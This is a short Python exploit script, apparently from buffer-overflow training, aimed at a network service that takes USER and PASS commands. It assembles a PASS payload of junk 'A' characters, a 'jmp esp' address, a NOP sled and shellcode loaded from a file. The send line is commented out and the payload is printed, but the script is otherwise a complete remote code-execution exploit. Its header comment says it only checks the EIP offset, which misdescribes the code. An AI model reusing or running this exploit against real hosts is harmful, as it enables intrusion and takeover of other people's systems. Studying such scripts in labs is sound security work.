#! /usr/bin/python3
## This program sends a string to host to verify the finding on position of EIP 
## It has following options to take input.
## -i(IP address), -p (port number), -a(amount of A) -c(amount of C)

import socket
import argparse

# Options for taking info

parser=argparse.ArgumentParser()
parser.add_argument('-i',help='IP address')
parser.add_argument('-p',help='Port',type=int)
parser.add_argument('-a', help='Amount of junk chars "A"',type=int)
parser.add_argument('-e', help='address of "jmp esp"') 
parser.add_argument('-f',help='Shellcode file')
args=parser.parse_args()

# Shellcode
file=open(args.f)
shellcode=file.read()

# esp
jmpesp=args.e

# Objects for encoding

string=('A'*args.a)
USER='USER TEST\n'
newline='\n'
PASS='PASS '
nop='\x90'*8

# Connect and send the string


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Sending the string...')
s.connect((args.i,args.p))
s.recv(1024)
s.send(USER.encode())
s.recv(1024)
#s.send(PASS.encode() + string.encode() + jmpesp.encode('latin-1')+ nop.encode('latin-1')+shellcode.encode('latin-1')+newline.encode())
test=(PASS.encode() + string.encode() + jmpesp.encode('latin-1')+ nop.encode('latin-1')+shellcode.encode('latin-1')+newline.encode())
print(test)
